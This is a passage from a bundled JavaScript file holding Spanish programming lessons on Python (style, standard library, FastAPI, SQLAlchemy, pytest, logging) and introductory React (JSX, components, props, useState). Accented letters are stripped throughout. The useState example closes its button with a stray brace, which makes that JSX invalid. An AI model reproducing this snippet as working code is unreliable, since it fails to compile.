funciona, escribe cdigo que otros pueden entender y modificar sin romper nada. \n',completed:!1,isProject:!0},{id:"python-13-buenas-practicas",title:"Buenas Prcticas (PEP 8 y Type Hints)",level:"semi-senior",content:`# Leccin 13: Buenas Prcticas (PEP 8 y Type Hints)

Escribir cdigo en Python es libre, pero hacerlo profesionalmente requiere disciplina.

## 1. La Gua de Estilo: PEP 8
Python tiene reglas claras.
*   **Indentacin:** 4 espacios (no tabs).
*   **Longitud de lnea:** Mximo 79 caracteres.
*   **Espacios:** Un espacio alrededor de operadores (\`a = b + c\`), pero no dentro de parntesis.
*   **Nombres:** \`snake_case\` para variables y funciones. \`CamelCase\` para Clases. \`UPPER_CASE\` para constantes.

## 2. Type Hinting (Tipado Esttico Opcional)
Desde Python 3.5, puedes (y debes) decir qu tipos espera tu funcin.
\`\`\`python
def saludar(nombre: str) -> str:
    return f"Hola {nombre}"
\`\`\`
Esto no hace que Python sea esttico (sigue siendo dinmico), pero ayuda muchsimo a los IDEs (VS Code) y Linters (\`mypy\`) a encontrar errores.

## 3. Docstrings
Documenta tus funciones.
\`\`\`python
def suma(a: int, b: int) -> int:
    """
    Calcula la suma de dos nmeros enteros.

    Args:
        a (int): Primer sumando.
        b (int): Segundo sumando.

    Returns:
        int: La suma de a y b.
    """
    return a + b
\`\`\`
Esto permite que al pasar el mouse sobre la funcin, veas la ayuda.

---

### Misin Semi-Senior:
Acostmbrate a escribir cdigo como si lo fueras a leer dentro de 6 meses. La claridad es reina.
`,completed:!1,isProject:!0},{id:"python-14-standard-lib-sys-os",title:"Standard Library (OS, Sys, Pathlib)",level:"semi-senior",content:'# Leccin 14: Standard Library (OS, Sys, Pathlib)\n\nPython viene con "pilas incluidas". La librera estndar es gigantesca y permite hacer casi cualquier cosa sin instalar nada externo.\n\n## 1. Interactuando con el sistema (`os` y `sys`)\n*   `sys.argv`: Permite leer los argumentos pasados por lnea de comandos.\n*   `sys.exit(1)`: Termina el programa indicando un error.\n*   `os.getenv("VAR")`: Lee variables de entorno.\n\n## 2. El moderno manejo de rutas (`pathlib`)\nAntes se usaba `os.path`. Hoy, un Semi-Senior usa `pathlib`.\n```python\nfrom pathlib import Path\n\n# Crear rutas agnsticas (funcionan en Windows y Linux)\nruta = Path("datos") / "usuarios" / "data.csv"\n\nif ruta.exists():\n    print(f"El archivo est en {ruta.resolve()}")\n    print(f"Nombre: {ruta.name}, Extensin: {ruta.suffix}")\n```\n\n## 3. Manejo de Fechas (`datetime`)\n```python\nfrom datetime import datetime, timedelta\n\nahora = datetime.now()\nmaana = ahora + timedelta(days=1)\n\nprint(ahora.strftime("%d/%m/%Y %H:%M")) # Formatear fecha\n```\n\n---\n\n### Misin Semi-Senior:\nDeja de concatenar rutas con strings (`"carpeta/" + archivo`). Eso rompe en Windows por las barras invertidas `\\`. Usa siempre `Pathlib`.\n',completed:!1},{id:"python-15-standard-lib-json-subprocess",title:"Standard Library (JSON, Subprocess)",level:"semi-senior",content:`# Leccin 15: Standard Library (JSON, Subprocess)

Maneja datos externos e interacta con otros comandos.

## 1. Mdulo \`json\`
Serializacin y deserializacin nativa.
\`\`\`python
import json

datos = {"nombre": "Juan", "edad": 20}
texto = json.dumps(datos, indent=4)  # De Dict a Str
nuevo_dict = json.loads(texto)       # De Str a Dict

# Directamente a archivo
with open("data.json", "w") as f:
    json.dump(datos, f)
\`\`\`

## 2. Ejecutar comandos del sistema (\`subprocess\`)
Ejecuta comandos de Bash/PowerShell desde Python.
\`\`\`python
import subprocess

try:
    # Captura la salida del comando "ls -l" o "dir"
    resultado = subprocess.run(["ls", "-l"], capture_output=True, text=True, check=True)
    print("Salida:", resultado.stdout)
except subprocess.CalledProcessError as e:
    print("El comando fall con cdigo:", e.returncode)
\`\`\`

## 3. Por qu \`subprocess\` en lugar de \`os.system\`?
\`os.system\` es inseguro y limitado. \`subprocess\` te permite:
*   Redirigir la entrada/salida estndar (Pipe).
*   Lanzar excepciones si el comando falla.
*   Evitar inyecciones de shell si usas la lista de argumentos \`["cmd", "arg"]\`.

---

### Misin Semi-Senior:
Automatiza tu trabajo. Usa Python para leer un archivo JSON, procesar sus datos y luego llamar a un comando de git o docker usando \`subprocess\`.
`,completed:!1},{id:"python-16-automatizacion-scripts",title:"Automatizacin de Tareas (Scripting)",level:"semi-senior",content:`# Leccin 16: Automatizacin de Tareas (Scripting)

Python es el sucesor espiritual de Bash para scripts complejos. Cuando un script de Bash supera las 50 lneas, es hora de pasarlo a Python.

## 1. Moviendo y renombrando archivos masivamente
Imagina que tienes una carpeta \`descargas\` llena de archivos y quieres organizarlos por extensin.
\`\`\`python
import shutil
from pathlib import Path

origen = Path("./descargas")
for archivo in origen.iterdir():
    if archivo.is_file():
        ext = archivo.suffix[1:] # quitar el punto
        carpeta_destino = origen / ext
        carpeta_destino.mkdir(exist_ok=True)
        shutil.move(str(archivo), str(carpeta_destino / archivo.name))
\`\`\`

## 2. Interactuando con Excel (CSV)
Muchas tareas de oficina implican leer un CSV, procesarlo y guardar otro.
\`\`\`python
import csv

with open("ventas.csv", "r") as f_in, open("resumen.csv", "w", newline="") as f_out:
    reader = csv.DictReader(f_in)
    writer = csv.DictWriter(f_out, fieldnames=["producto", "total"])
    writer.writeheader()

    for row in reader:
        total = int(row["cantidad"]) * float(row["precio"])
        writer.writerow({"producto": row["producto"], "total": total})
\`\`\`

## 3. Automatizacin de Web (Requests bsico)
\`\`\`python
import requests # pip install requests

resp = requests.get("https://api.clima.com/mendoza")
if resp.status_code == 200:
    temp = resp.json()["temperatura"]
    if temp > 30:
        print("Alerta de calor! Enciende el aire acondicionado.")
\`\`\`

---

### Misin de Automatizacin:
Identifica una tarea aburrida que hagas todos los das (borrar temporales, renombrar fotos, revisar precios) y escribe un script de Python que lo haga por ti.
`,completed:!1},{id:"python-17-cli-tools",title:"Creando CLIs (Command Line Interfaces)",level:"semi-senior",content:`# Leccin 17: Creando CLIs (Command Line Interfaces)

Quieres crear herramientas que se sientan profesionales como \`git\` o \`npm\`? Necesitas \`argparse\` o libreras modernas como \`Typer\`.

## 1. El mdulo \`argparse\` (Nativo)
\`\`\`python
import argparse

parser = argparse.ArgumentParser(description="Calculadora CLI")
parser.add_argument("x", type=int, help="El primer nmero")
parser.add_argument("y", type=int, help="El segundo nmero")
parser.add_argument("--sumar", action="store_true", help="Realizar suma")

args = parser.parse_args()

if args.sumar:
    print(f"La suma es: {args.x + args.y}")
\`\`\`
Ahora puedes ejecutar: \`python calculadora.py 5 10 --sumar\`.

## 2. Interactividad con \`input\` enriquecido
Para scripts interactivos que preguntan cosas al usuario.
\`\`\`python
nombre = input("Cmo te llamas? ")
edad = int(input("Edad? "))
\`\`\`

## 3. Barras de Progreso (Librera \`tqdm\`)
Si tu script tarda mucho, muestra feedback visual.
\`\`\`python
from tqdm import tqdm # pip install tqdm
import time

for _ in tqdm(range(100)):
    time.sleep(0.1) # Simulando trabajo pesado
\`\`\`

---

### Misin CLI:
Crea un script llamado \`todo.py\` que permita agregar tareas (\`todo.py add "Comprar pan"\`) y listar tareas (\`todo.py list\`). Guarda las tareas en un archivo JSON local.
`,completed:!1},{id:"python-18-arquitectura-proyectos",title:"Arquitectura de Proyectos Profesionales",level:"senior",content:`# Leccin 18: Arquitectura de Proyectos Profesionales

Escribir un script es fcil. Mantener un proyecto de 50,000 lneas requiere arquitectura.

## 1. Estructura de Proyecto (The Src Layout)
El estndar moderno para paquetes Python es poner el cdigo dentro de un directorio \`src\`.
\`\`\`
mi_proyecto/
 pyproject.toml      # Configuracin de dependencias y herramientas
 src/
    mi_paquete/
        __init__.py
        core/       # Lgica de negocio pura
        api/        # Endpoints o CLI
        db/         # Adaptadores de base de datos
 tests/              # Tests fuera del cdigo fuente
 README.md
\`\`\`
Esto evita problemas de importacin accidentales durante el desarrollo.

## 2. Gestin de Dependencias Moderna (\`Poetry\` vs \`Pip\`)
\`pip\` con \`requirements.txt\` es bsico. **Poetry** es el estndar moderno profesional.
*   Maneja dependencias y sub-dependencias.
*   Crea el virtualenv automticamente.
*   Empaqueta tu proyecto para subirlo a PyPI.

## 3. Principios de Diseo
Python es muy flexible, pero eso permite cdigo espagueti.
*   **Inyeccin de Dependencias:** No instancies clases de base de datos dentro de tu lgica de negocio. Psalas como argumentos.
*   **Capas:** Separa la lgica de dominio (Core) de la infraestructura (Flask, Django, SQL).

---

### Visin Senior:
"Un buen proyecto Python debe poder ser instalado con un solo comando (\`poetry install\`) y testeado con otro (\`pytest\`), sin configuraciones manuales oscuras".
`,completed:!1},{id:"python-19-tipado-avanzado",title:"Tipado Avanzado y Protocolos",level:"senior",content:`# Leccin 19: Tipado Avanzado y Protocolos

Ms all de \`str\` e \`int\`. El Tipado Avanzado en Python permite que el control esttico sea tan poderoso como en TypeScript o C#.

## 1. Union y Optional (\`Any\` es el enemigo)
\`Union[str, int]\` significa que una variable puede ser uno de dos tipos.
\`Optional[str]\` es igual a \`Union[str, None]\`.

## 2. Generics (\`TypeVar\`)
Cuando una funcin devuelve el mismo tipo que recibe, pero ese tipo puede variar.
\`\`\`python
from typing import TypeVar, List

T = TypeVar('T')

def invertir(lista: List[T]) -> List[T]:
    return lista[::-1]

# Si entra List[int], devuelve List[int]. Si entra List[str], devuelve List[str].
# Mypy nos avisar si intentamos mezclar los tipos.
\`\`\`

## 3. Protocolos (\`Protocol\`)
El "Pato Tipado Esttico" (Static Duck Typing). En lugar de herencia, defines un contrato.
\`\`\`python
from typing import Protocol

class Volador(Protocol):
    def volar(self) -> None: ...

def ejecutar_vuelo(objeto: Volador):
    objeto.volar()
\`\`\`
Cualquier clase que tenga un mtodo \`volar\` ser aceptada, sin necesidad de heredar explcitamente de \`Volador\`.

## 4. Pydantic (Validacin de Tipos en Ejecucin)
Las Type Hints normales solo sirven para anlisis esttico.
*   **Pydantic** usa esas hints para validar datos **en tiempo de ejecucin**.
*   Es la base de FastAPI.

---

### Misin Senior:
No uses \`Any\`. Un Senior prefiere definir un Protocolo o una Unin compleja antes que rendirse al \`Any\`.
`,completed:!1},{id:"python-20-performance-profiling",title:"Performance, Concurrencia y Profiling",level:"senior",content:`# Leccin 20: Performance, Concurrencia y Profiling

Python tiene fama de lento. Como Senior, sabes por qu y cmo acelerarlo.

## 1. El GIL (Global Interpreter Lock)
Python es un lenguaje interpretado con un "candado" global.
*   **Problema:** En sistemas multi-core, Python solo puede usar 1 core a la vez para ejecutar cdigo Python puro.
*   **Excepcin:** Cuando llamas a una librera de C (Numpy, Pandas), el GIL se libera.

## 2. Threads vs Multiprocessing
*   **Threading (\`I/O-bound\`):** Usa hilos cuando el cuello de botella es esperar datos (Network, Disco). El GIL se libera al esperar.
*   **Multiprocessing (\`CPU-bound\`):** Usa procesos cuando necesitas clculos puros. Crea un nuevo proceso Python separado.

## 3. Asyncio
Para desarrollo web (FastAPI), Asyncio es el estndar.
\`\`\`python
import asyncio

async def tarea():
    print("Empezando")
    await asyncio.sleep(1) # Libera el control mientras espera
    print("Terminado")

asyncio.run(tarea())
\`\`\`
Permite manejar miles de conexiones simultneas en un solo hilo.

## 4. Profiling (\`cProfile\`)
Nunca adivines dnde est lento tu cdigo. Mdelo.
\`\`\`bash
python -m cProfile script.py
\`\`\`
Te dir exactamente cuntas veces se llam a cada funcin y cunto tard.

---

### Misin Senior:
No reescribas todo el cdigo en C++ por "optimizacin prematura". Primero haz Profiling, encuentra la funcin lenta y luego optimize esa nica funcin (quizs usando Cython o PyO3).
`,completed:!1},{id:"python-21-testing-pro",title:"Testing Profesional (Pytest y Mocks)",level:"senior",content:`# Leccin 21: Testing Profesional (Pytest y Mocks)

Si tu cdigo no tiene tests, no existe. Pero usar \`unittest\` se siente como trabajar en 1999. El framework de facto moderno es **Pytest**.

## 1. Pytest (\`assert\`)
Olvdate de \`self.assertEqual(a, b)\`. Pytest te permite usar \`assert a == b\` y te muestra **por qu** fall de forma mgica.

## 2. Fixtures Avanzados (\`@pytest.fixture\`)
*   **Fixture:** Algo necesario para ejecutar un test (una conexin DB, un usuario creado).
*   **Reutilizacin:** Definir las fixtures en un archivo \`conftest.py\` para que todos los tests las compartan.
\`\`\`python
@pytest.fixture
def usuario_db():
    u = User(name="Test")
    db.add(u)
    yield u  # El test se ejecuta aqu
    db.remove(u)  # Limpieza post-test (Teardown)
\`\`\`

## 3. Mocking (\`unittest.mock\`)
Cuando testeas tu lgica, no quieres llamar al API de Stripe de verdad.
\`\`\`python
def test_pago(mocker):
    # Mockeamos la funcin de Stripe para que devuelva xito siempre
    mocker.patch('stripe.Charge.create', return_value={'status': 'succeeded'})
    
    resultado = procesar_pago(100)
    assert resultado == True
\`\`\`

## 4. Coverage (Cobertura)
Mide qu lneas de tu cdigo se ejecutaron durante los tests.
\`pytest --cov=src\`
Un Senior sabe que 100% de coverage no garantiza 0 bugs, pero 0% garantiza desastre.

---

### Misin Senior:
Escribe tests parametrizados (\`@pytest.mark.parametrize\`) para probar 10 escenarios con 1 sola funcin de test. Menos cdigo, ms robustez.
`,completed:!1},{id:"python-22-logging-configuracion",title:"Logging y Configuracin Profesional",level:"senior",content:`# Leccin 22: Logging y Configuracin Profesional

Hacer \`print("Error")\` en produccin es imperdonable. La visibilidad de logs y configuraciones es lo que diferencia a un Sr. de un Jr.

## 1. Mdulo \`logging\`
Nunca subestimes la librera estndar. Configurar handlers para que los errores vayan a Sentry y los infos a un archivo \`.log\` es trivial.
\`\`\`python
logger = logging.getLogger("mi_app")
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logger.info("Inicio del proceso")
\`\`\`

## 2. Gestin de Configuracin (12-Factor App)
Las configuraciones (base de datos, secretos) deben venir del entorno, no estar hardcodeadas.
*   **Pydantic Settings:** Valida que las variables de entorno existan y tengan el tipo correcto al arrancar la app.
\`\`\`python
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    db_url: str
    api_key: str

    class Config:
        env_file = ".env"

settings = Settings()
# Si falta .env o una variable, la app CRASHEA inmediatamente con un mensaje claro.
\`\`\`

## 3. Structured Logging (JSON Logs)
En la nube, los logs planos son difciles de indexar. Usa libreras como \`structlog\` para generar logs en JSON que herramientas como Datadog o Kibana puedan filtrar fcilmente.

---

### Misin Senior:
Crea un sistema de logging que incluya un \`Correlation ID\` (requestId) en cada mensaje loggeado para rastrear una peticin HTTP a travs de mltiples microservicios.
`,completed:!1},{id:"python-23-practica-senior",title:"Evaluacin Senior: El Arquitecto Python",level:"senior",content:`# Evaluacin Senior: El Arquitecto Python

Ahora el cliente no te pide un script, te pide una plataforma mantenible por 5 aos.

---

## 1. El Desafo del GIL (Performance)
**Pregunta:** Un script de procesamiento de imgenes usa \`threading\` para aplicar filtros a 1000 fotos en paralelo, pero tarda lo mismo que en secuencial. Por qu ocurre esto y cmo usaras \`multiprocessing\` para arreglarlo? (Explica la diferencia entre CPU-bound e I/O-bound).

## 2. Tipado Estricto (Architecture)
**Consigna:** Tienes una funcin \`procesar_dato(input: Any) -> Any\`.
*   Reescrbela usando \`TypeVar\`, \`Protocol\` o \`Union\` para que sea typesafe.
*   Explica por qu usar \`Any\` elimina todos los beneficios de usar un lenguaje moderno.

## 3. Testing Profesional (Pytest)
**Escenario:** Tienes una funcin que llama a una API externa de clima, procesa los datos y los guarda en una base de datos SQL.
*   Describe cmo escribiras un test unitario para la lgica de procesamiento **sin** tocar ni la API real ni la Base de Datos real. (Pista: Mocking y Fixtures).

---

### Recordatorio Final:
En Python, "Simple es mejor que complejo" (Zen of Python). Pero simple no significa simplista. Significa encapsular la complejidad en mdulos bien definidos. 
`,completed:!1,isProject:!0},{id:"python-24-backend-fastapi",title:"Backend Moderno con FastAPI",level:"senior",content:`# Leccin 24: Backend Moderno con FastAPI

Olvdate de Flask o Django por un momento. El estndar moderno para APIs de alto rendimiento en Python es **FastAPI**.

## 1. Por qu FastAPI?
*   **Velocidad:** Tan rpido como NodeJS o Go (gracias a Starlette y Pydantic).
*   **Async:** Soporte nativo para \`async/await\`.
*   **Autodocumentacin:** Genera Swagger UI (\`/docs\`) automticamente basndose en tus tipos de Python.

## 2. Tu primer Endpoint
\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    nombre: str
    precio: float
    es_oferta: bool = False

@app.get("/")
def leer_raiz():
    return {"mensaje": "Hola Mundo"}

@app.post("/items/")
async def crear_item(item: Item):
    return item # FastAPI se encarga de convertir el objeto a JSON
\`\`\`

## 3. Peticiones (Requests)
FastAPI lee los datos de:
*   **Path Parameters:** \`/items/{item_id}\`
*   **Query Parameters:** \`/items/?skip=0&limit=10\`
*   **Body:** JSON enviado en el cuerpo del POST.

---

### Concepto Backend:
FastAPI valida los datos **antes** de que lleguen a tu funcin. Si el cliente enva un string en lugar de un float para el precio, FastAPI devuelve un error \`422 Unprocessable Entity\` automticamente.
`,completed:!1},{id:"python-25-backend-database",title:"Conexin a Base de Datos (SQLAlchemy)",level:"senior",content:`# Leccin 25: Conexin a Base de Datos (SQLAlchemy)

Para que tu API sea til, necesita guardar datos. En Python, el ORM estndar es **SQLAlchemy**.

## 1. El modelo (\`declarative_base\`)
Define cmo es tu tabla en Python.
\`\`\`python
from sqlalchemy import Column, Integer, String
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

class Usuario(Base):
    __tablename__ = "usuarios"
    
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True)
    hashed_password = Column(String)
\`\`\`

## 2. La Sesin
Para interactuar con la DB, abrimos una sesin.
*   **Patrn Unit of Work:** Hacemos todos los cambios (\`session.add(usuario)\`) y al final confirmamos (\`session.commit()\`). Si algo falla, hacemos \`session.rollback()\`.

## 3. Integracin con FastAPI
Usamos \`Dependency Injection\` para darle una sesin de DB a cada peticin.
\`\`\`python
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

@app.post("/users/")
def create_user(user: UserCreate, db: Session = Depends(get_db)):
    db_user = Usuario(email=user.email)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user
\`\`\`

---

### Misin Backend:
Nunca abras conexiones globales a la DB. Usa un sistema de "Connection Pool" (que SQLAlchemy ya trae por defecto) para reutilizar conexiones y no saturar el servidor de base de datos.
`,completed:!1},{id:"python-26-testing-intro",title:"Testing Fundamental (Pytest)",level:"senior",content:`# Leccin 26: Testing Fundamental (Pytest)

Las pruebas no son algo opcional. Si no testeas tu cdigo, tus usuarios lo harn por ti (y no les gustar).

## 1. Pytest: El Rey del Testing
Olvdate de \`unittest\`. Pytest es ms simple y poderoso.
\`\`\`python
# test_calculadora.py
def sumar(a, b):
    return a + b

def test_suma_basica():
    assert sumar(2, 3) == 5

def test_suma_negativos():
    assert sumar(-1, 1) == 0
\`\`\`
Ejecutas con el comando \`pytest\`.

## 2. Tipos de Tests
*   **Unitarios:** Prueban una sola funcin aislada (ej: \`sumar\`). Deben ser rapidsimos (milisegundos).
*   **Integracin:** Prueban cmo interactan dos piezas (ej: \`API -> Base de Datos\`).
*   **E2E (End-to-End):** Prueban el flujo completo desde el usuario.

## 3. Fixtures: Preparando el terreno
Las \`fixtures\` son funciones que preparan datos antes de cada test.
\`\`\`python
import pytest

@pytest.fixture
def usuario_ejemplo():
    return {"nombre": "Ana", "edad": 30}

def test_edad_usuario(usuario_ejemplo):
    assert usuario_ejemplo["edad"] > 18
\`\`\`

---

### Misin Testing:
Escribe tests para romper tu propio cdigo. No testes olo el "Happy Path" (cuando todo sale bien), testea qu pasa si envas \`null\`, nmeros negativos o strings vacos.
`,completed:!1},{id:"python-27-roadmap-y-errores",title:"Errores, Anti-patrones y Roadmap Python",level:"senior",content:`# Leccin 27: Errores, Anti-patrones y Roadmap Python

Aprender Python es un viaje. Aqu te dejo un mapa para que no te pierdas.

## 1. Errores Comunes de Pythonistas
*   **"Catch-all":** Usar \`except:\` o \`except Exception:\` sin especificar qu error esperas. Esto oculta bugs legtimos.
*   **Mutable Default Arguments:** Usar listas o diccionarios como valor por defecto en una funcin (\`def f(x=[]):\`).
*   **No usar Context Managers:** Abrir archivos sin \`with\` y olvidar cerrarlos.
*   **Concatenar Strings en Bucles:** Usar \`+=\` en un string dentro de un bucle de 1000 iteraciones es muy lento. Usa \`"".join(lista)\`.

## 2. Roadmap: De Junior a Pythonista Senior

### Fase 1: El Script Kid (1-6 meses)
*   **Aprender:** Sintaxis, bucles, listas, diccionarios, regex bsico.
*   **Proyecto:** Scripts de automatizacin, mover archivos, descargar webs (scraping simple).

### Fase 2: El Constructor de Aplicaciones (6-18 meses)
*   **Aprender:** POO, excepciones, mdulos, paquetes, \`pip\`, \`venv\`, Git, Testing bsico.
*   **Proyecto:** Una API con FastAPI o un sitio con Django. Un bot de Discord o Telegram.

### Fase 3: El Ingeniero de Software (18+ meses)
*   **Aprender:** Concurrencia (\`asyncio\`), arquitectura limpia, Docker, CI/CD, patrones de diseo, optimizacin de memoria.
*   **Proyecto:** Sistemas distribuidos, microservicios, libreras open source publicadas en PyPI.

---

### Misin Final:
No te detengas. Python es enorme. Aprende Numpy y Pandas si te gusta Data Science. Aprende Django y FastAPI si te gusta Web. Aprende PyScript si quieres correr Python en el navegador. El cielo es el lmite!
`,completed:!1}]},A1={id:"react-module",title:"React",description:"Aprende a construir interfaces de usuario modernas, reactivas y basadas en componentes.",completed:!1,lessons:[{id:"react-junior-intro-react",title:"Qu es React y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es React y por qu usarlo?

React es una **biblioteca de JavaScript** (no un framework) creada por Facebook para construir interfaces de usuario basadas en componentes.

## 1. El Enfoque Declarativo
En JavaScript tradicional (Vainilla), solemos usar un enfoque **Imperativo**:
> "Busca el botn, agrgale un listener, cuando hagan click busca el div, cmbiale el texto a 'Cargando'..."

En React, usamos un enfoque **Declarativo**:
> "Este es el estado de mi componente. Si est cargando, muestra esto; si no, muestra aquello".

React se encarga de actualizar el DOM por ti de la forma ms eficiente posible.

## 2. El poder de los Componentes
Imagina una aplicacin como un juego de LEGO. Cada pieza es un componente: el botn, la barra de navegacin, la tarjeta de producto.
*   **Reutilizables:** Escribes el cdigo una vez, lo usas en 10 pginas.
*   **Aislados:** Si falla el componente de "Comentarios", el resto de la pgina sigue funcionando.

## 3. Por qu TypeScript con React?
React es muy dinmico. Usar TypeScript nos permite:
1.  Saber qu "props" (datos) recibe un componente sin adivinar.
2.  Evitar errores comunes como pasar un string donde se esperaba un nmero.
3.  Autocompletado inteligente en VS Code.

## 4. El Virtual DOM (Concepto Clave)
Manipular el DOM real del navegador es lento. React crea una copia ligera llamada **Virtual DOM**.
1.  Cuando algo cambia, React actualiza el Virtual DOM.
2.  Compara la versin vieja con la nueva (Diffing).
3.  Solo aplica al navegador los cambios estrictamente necesarios (Reconciliacin).

---

## Mini Ejercicio
Piensa en una red social como Instagram. Enumera al menos 5 componentes que podras identificar en su interfaz principal.
`,completed:!1},{id:"react-junior-spa-vs-mpa",title:"SPA vs Aplicaciones Tradicionales",level:"junior",content:`# Leccin 2: SPA vs Aplicaciones Tradicionales

Para entender React, debemos entender cmo cambia la forma en que navegamos por la web.

## 1. Aplicaciones Tradicionales (MPA)
En una **Multi-Page Application**, cada vez que haces click en un enlace:
1.  El navegador enva una peticin al servidor.
2.  El servidor genera un HTML completo.
3.  El navegador recarga **TODA** la pgina.
4.  Sentimos ese "parpadeo" blanco entre pginas.

## 2. Single Page Applications (SPA)
React permite crear **Single Page Applications**.
1.  Cargamos el HTML una sola vez (un archivo casi vaco con un \`<div id="root"></div>\`).
2.  React toma el control del navegador.
3.  Cuando navegamos, React limpia la pantalla y dibuja los nuevos componentes **instantneamente**, sin recargar la pgina.

## 3. Ventajas de la SPA
*   **Velocidad:** La carga inicial puede ser un poco ms pesada, pero la navegacin posterior es inmediata.
*   **Experiencia de Usuario:** Se siente como una aplicacin nativa de celular, suave y fluida.
*   **Ahorro de Datos:** Solo pedimos al servidor los datos (JSON) que necesitamos, no todo el HTML y CSS de nuevo.

## 4. El Rol de React
React es el "motor" que decide qu piezas de la pantalla mostrar en cada momento basndose en la lgica que t definas.

---

## Mini Ejercicio
Observa la URL de esta aplicacin (progavio). Haz click en diferentes mdulos. La pgina se recarga por completo o solo cambia el contenido central?
`,completed:!1},{id:"react-junior-jsx",title:"JSX (JavaScript XML)",level:"junior",content:`# Leccin 3: JSX (JavaScript XML)

A primera vista, JSX parece HTML, pero no te confundas: **es JavaScript con superpoderes**.

## 1. Qu es JSX?
Es una extensin de sintaxis que permite escribir la estructura de tu interfaz de manera visual dentro de tus archivos de lgica.

\`\`\`tsx
const elemento = <h1>Hola Mundo</h1>;
\`\`\`

## 2. Reglas de Oro de JSX

### A. Raz nica
Un componente debe retornar **un solo elemento padre**. Si tienes varios elementos, debes envolverlos en un \`<div>\` o en un **Fragment** \`<> ... </>\`.

\`\`\`tsx
//  Error
return (
  <h1>Ttulo</h1>
  <p>Prrafo</p>
);

//  Correcto (Fragment)
return (
  <>
    <h1>Ttulo</h1>
    <p>Prrafo</p>
  </>
);
\`\`\`

### B. JavaScript entre llaves \`{}\`
Puedes insertar cualquier expresin vlida de JS dentro de JSX usando llaves.

\`\`\`tsx
const nombre = "Octavio";
return <h1>Hola {nombre.toUpperCase()}</h1>;
\`\`\`

### C. CamelCase para Atributos
En HTML usamos \`class\`. En JSX usamos \`className\`.
En HTML usamos \`onclick\`. En JSX usamos \`onClick\`.

\`\`\`tsx
<button className="btn-primary" onClick={handleClick}>
  Click aqu
</button>
\`\`\`

## 3. Comentarios en JSX
Para comentar dentro del retorno de un componente, debes usar la sintaxis de JS dentro de llaves: \`{/* mi comentario */}\`.

---

## Mini Ejercicio
Intenta escribir un fragmento de JSX que renderice un \`div\` con un \`h2\`, un \`p\` que muestre el resultado de \`2 + 2\`, y una imagen (\`img\`) que tenga un atributo \`alt\`.
`,completed:!1},{id:"react-junior-componentes-funcionales",title:"Componentes Funcionales",level:"junior",content:`# Leccin 4: Componentes Funcionales

En el React moderno, los componentes son simplemente funciones de JavaScript que devuelven JSX.

## 1. Creando tu primer componente
Un componente es una funcin que empieza con **Mayscula** (PascalCase). Esto es obligatorio para que React lo distinga de una etiqueta HTML normal.

\`\`\`tsx
// Definicin
function MiBoton() {
  return (
    <button>Soy un botn</button>
  );
}

// Uso (dentro de otro componente)
function App() {
  return (
    <div>
      <h1>Bienvenido</h1>
      <MiBoton />
    </div>
  );
}
\`\`\`

## 2. Exportacin e Importacin
Solemos tener un archivo por componente para mantener el proyecto organizado.

\`\`\`tsx
// components/Title.tsx
export function Title() {
  return <h1>Mi Ttulo</h1>;
}

// App.tsx
import { Title } from './components/Title';
\`\`\`

## 3. Tipado de Componentes (TypeScript)
Como estamos usando TypeScript, podemos definir que una funcin devuelve un elemento de React.

\`\`\`tsx
import React from 'react';

const Card: React.FC = () => {
  return <div className="card">Contenido</div>;
};
\`\`\`
*Tip: \`React.FC\` significa "Functional Component".*

## 4. Error Comn: Olvidar el return
Si tu funcin no retorna nada (o retorna \`undefined\`), React lanzar un error. Asegrate de siempre devolver JSX o \`null\`.

---

## Mini Ejercicio
Crea un componente llamado \`UserProfile\` que retorne un \`div\` con un \`h3\` (Nombre de usuario) y un \`span\` (Estado: Activo).
`,completed:!1},{id:"react-junior-props",title:"Props (Comunicacin entre Componentes)",level:"junior",content:`# Leccin 5: Props (Comunicacin entre Componentes)

Las **Props** (propiedades) son la forma en que pasamos datos de un componente padre a un componente hijo.

## 1. El flujo de datos
En React, los datos fluyen en una sola direccin: **hacia abajo**. Un componente hijo no puede (ni debe) modificar las props que recibe de su padre. Las props son **solo de lectura**.

## 2. Implementacin con TypeScript
Aqu es donde TypeScript brilla. Definimos una \`interface\` para especificar qu datos esperamos recibir.

\`\`\`tsx
interface SaludoProps {
  nombre: string;
  edad?: number; // Opcional
}

function Saludo(props: SaludoProps) {
  return (
    <div>
      <h1>Hola {props.nombre}</h1>
      {props.edad && <p>Tienes {props.edad} aos</p>}
    </div>
  );
}

// Uso desde el padre
<Saludo nombre="Octavio" edad={25} />
\`\`\`

## 3. Desestructuracin de Props (Mejor Prctica)
En lugar de escribir \`props.nombre\` todo el tiempo, solemos desestructurar los argumentos de la funcin.

\`\`\`tsx
function Saludo({ nombre, edad }: SaludoProps) {
  return <h1>Hola {nombre}</h1>;
}
\`\`\`

## 4. Pasar funciones como Props
Tambin podemos pasar funciones. Esto permite que el hijo le "avise" algo al padre (ej: cuando se hace click en un botn interno).

\`\`\`tsx
interface ButtonProps {
  text: string;
  onClick: () => void;
}

function MagicButton({ text, onClick }: ButtonProps) {
  return <button onClick={onClick}>{text}</button>;
}
\`\`\`

---

## Mini Ejercicio
Crea una interface \`ProductCardProps\` que tenga \`title\` (string), \`price\` (number) e \`isAvailable\` (boolean). Luego, crea el componente que use esas props.
`,completed:!1},{id:"react-junior-state-usestate",title:"El Estado (useState)",level:"junior",content:`# Leccin 6: El Estado (useState)

Si las props son datos que vienen de afuera, el **Estado** es la memoria interna de un componente. El estado permite que la interfaz cambie segn las acciones del usuario.

## 1. El Hook \`useState\`
Para usar el estado, importamos un **Hook** de React.

\`\`\`tsx
import { useState } from 'react';

function Contador() {
  // declaramos: [valorActual, funcinParaCambiarlo] = useState(valorInicial)
  const [cuenta, setCuenta] = useState(0);

  return (
    <div>
      <p>Has hecho click {cuenta} veces</p>
      <button onClick={() => setCuenta(cuenta + 1)}>
        Aumentar
      }
    </div>
  );
}
\`\`\`

## 2. Cmo funciona?
Cuando llamas a \`setCuenta\`, React se da cuenta de que el estado cambi y **vuelve a ejecutar la funcin del componente** (re-render) para dibujar la nueva UI con el valor actualizado.

